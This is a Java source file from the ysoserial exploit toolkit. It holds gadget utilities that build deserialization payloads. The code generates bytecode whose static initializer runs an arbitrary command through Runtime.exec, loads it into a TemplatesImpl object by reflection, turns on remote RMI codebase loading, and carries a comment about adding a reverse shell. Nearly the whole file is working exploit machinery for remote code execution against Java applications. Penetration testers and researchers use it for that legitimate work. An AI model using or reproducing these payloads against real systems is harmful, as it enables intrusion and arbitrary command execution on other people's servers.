package ysoserial.payloads.util;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.Modifier;
import javassist.*;
import ysoserial.Strings;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.*;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
    "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    private static String CLASS_PREFIX;

    static {
        String classPrefix = System.getProperty("ysoserial.class_prefix", "javax.objects.Object");
        if(classPrefix.startsWith("java.")) {
            System.err.println("Error: cannot use the 'java' internal and sealed package for 'ysoserial.class_prefix'.");
            System.exit(1);
        }
        CLASS_PREFIX = classPrefix;
    }

    public static void overrideClassPrefix(String prefix) {
        CLASS_PREFIX = prefix;
    }

    public static String generateRandomClassName() {
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        return CLASS_PREFIX + System.nanoTime();
    }

    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl ( final String[] command ) throws Exception {
        // run command in static initializer
        String args = "new String[]{"
            + Strings.join(Arrays.asList(Strings.escapeJavaStrings(command)), ", ", "\"", "\"")
            + '}';
        return createTemplatesImplFromInline("java.lang.Runtime.getRuntime().exec("+ args +");");
    }


    public static Object createTemplatesImpl( final String command ) throws Exception {
        // run command in static initializer (old behavior)
        String arg = "\"" + Strings.escapeJavaString(command) + "\"";
        return createTemplatesImplFromInline("java.lang.Runtime.getRuntime().exec("+ arg +");");
    }


    public static Object createTemplatesImplFromInline( final String inlineCode ) throws Exception {
        return createTemplatesImpl(inlineCode, new byte[][]{});
    }


    public static Object createClassTemplatesImplFromJar( final String jarFilePath, final String[] mainArgs ) throws Exception {
        JarFile jarFile = new JarFile(new File(jarFilePath), false);
        String mainClass = jarFile.getManifest().getMainAttributes().getValue("Main-Class");
        if(mainClass == null)
            throw new IllegalArgumentException("No Main-Class manifest value found.");
        return createClassTemplatesImplFromJar(jarFilePath, mainArgs, mainClass);
    }


    public static Object createClassTemplatesImplFromJar( final String jarFilePath, final String[] mainArgs, String mainClass ) throws Exception {
        JarFile jarFile = new JarFile(new File(jarFilePath), false);
        mainClass = Strings.escapeJavaString(mainClass);

        String args = "";
        if(mainArgs.length == 0) {
            args = "new String[0]";
        } else {
            args = "new String[]{"
                + Strings.join(Arrays.asList(Strings.escapeJavaStrings(mainArgs)), ", ", "\"", "\"")
                + '}';
        }

        // run main method of main-class in static initializer
        String initializer = "java.lang.Class.forName(\""+mainClass+"\")" +
            ".getMethod(\"main\", new Class[]{String[].class})" +
            ".invoke(null, new Object[]{"+ args + "});";
        List<byte[]> bytecodesList = new ArrayList<byte[]>();
        byte[] buf = new byte[4096];
        for (Enumeration<JarEntry> en = jarFile.entries(); en.hasMoreElements(); ) {
            JarEntry entry = en.nextElement();
            if(!entry.getName().endsWith(".class")) continue;

            InputStream is = jarFile.getInputStream(entry);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            int bRead;
            while ((bRead = is.read(buf)) >= 0) {
                bos.write(buf, 0, bRead);
            }
            bytecodesList.add(bos.toByteArray());
        }

        return createTemplatesImpl(initializer, bytecodesList.toArray(new byte[][]{}));
    }

    public static Object createTemplatesImpl ( final String inlineCode , final byte[][] extraClasses ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                inlineCode,
                extraClasses,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(inlineCode, extraClasses, TemplatesImpl.class,
            AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl ( final String inlineCode, byte[][] extraClasses, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        final CtClass clazz = pool.makeClass(generateRandomClassName());

        clazz.setInterfaces(new CtClass[] {
            pool.get(Serializable.class.getName())
        });
        clazz.setSuperclass(pool.get(abstTranslet.getName()));

        CtField serialVersionUID = new CtField(CtClass.longType, "serialVersionUID", clazz);
        serialVersionUID.setModifiers(Modifier.STATIC | Modifier.FINAL | Modifier.PRIVATE);
        clazz.addField(serialVersionUID, String.valueOf(-5971610431559700674L));

        // set custom Java code block in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        clazz.makeClassInitializer().insertAfter(inlineCode);

        // avoid raising exceptions
        clazz.addConstructor(CtNewConstructor.make(new CtClass[0], new CtClass[0],
                "this.namesArray = new String[0];", clazz));

        final byte[][] bytecodes = new byte[extraClasses.length + 2][];
        System.arraycopy(extraClasses, 0, bytecodes, 0, extraClasses.length);
        bytecodes[bytecodes.length - 2] = clazz.toBytecode();

        CtClass serializableClass = pool.makeClass(CLASS_PREFIX + ".Serial");
        serializableClass.setInterfaces(new CtClass[] {
            pool.get(Serializable.class.getName())
        });
        serialVersionUID = new CtField(CtClass.longType, "serialVersionUID", serializableClass);
        serialVersionUID.setModifiers(Modifier.STATIC | Modifier.FINAL | Modifier.PRIVATE);
        serializableClass.addField(serialVersionUID, String.valueOf(8207363842866235160L));

        // required to make TemplatesImpl happy
        bytecodes[bytecodes.length - 1] = serializableClass.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", bytecodes);

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", generateRandomClassName());
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}
